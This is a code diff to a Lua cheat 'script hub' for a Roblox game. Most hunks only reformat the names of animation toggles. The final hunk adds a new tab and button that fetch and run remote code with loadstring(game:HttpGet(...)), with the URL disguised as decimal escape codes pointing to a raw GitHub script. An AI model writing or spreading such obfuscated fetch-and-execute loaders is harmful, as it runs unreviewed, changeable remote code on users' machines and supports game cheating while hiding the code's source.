@@ -3019,7 +3019,7 @@ Tab:AddToggle({
 end})
 
 Tab:AddToggle({
-    Name = "CuirassierCharge动画",
+    Name = "Cuirassier Charge动画",
     Default = false,
     Callback = function(Value)
     flags.CuirassierChargeAnimation = Value
@@ -3173,7 +3173,7 @@ Tab:AddToggle({
 end})
 
 Tab:AddToggle({
-    Name = "ChargeLance动画",
+    Name = "Charge Lance动画",
     Default = false,
     Callback = function(Value)
     flags.ChargeLanceAnimation = Value
@@ -3250,7 +3250,7 @@ Tab:AddToggle({
 end})
 
 Tab:AddToggle({
-    Name = "ChargeHeavy动画",
+    Name = "Charge Heavy动画",
     Default = false,
     Callback = function(Value)
     flags.ChargeHeavyAnimation = Value
@@ -3327,7 +3327,7 @@ Tab:AddToggle({
 end})
 
 Tab:AddToggle({
-    Name = "HeadlessHorseman动画1",
+    Name = "Headless Horseman动画1",
     Default = false,
     Callback = function(Value)
     flags.HeadlessHorsemanAnimation1 = Value
@@ -3404,7 +3404,7 @@ Tab:AddToggle({
 end})
 
 Tab:AddToggle({
-    Name = "HeadlessHorseman动画2",
+    Name = "Headless Horseman动画2",
     Default = false,
     Callback = function(Value)
     flags.HeadlessHorsemanAnimation2 = Value
@@ -3525,6 +3525,18 @@ Tab:AddButton({
             end)
         end)
     end
+end})
+
+local Tab = Window:MakeTab({
+      Name = "莱克星顿与康科德",
+      Icon = "rbxassetid://14250466898",
+      PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "明月清风",
+    Callback = function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\67\104\105\110\97\81\89\47\83\99\114\105\112\116\115\47\77\97\105\110\47\76\67"))()
 end})
 
 local Tab = Window:MakeTab({
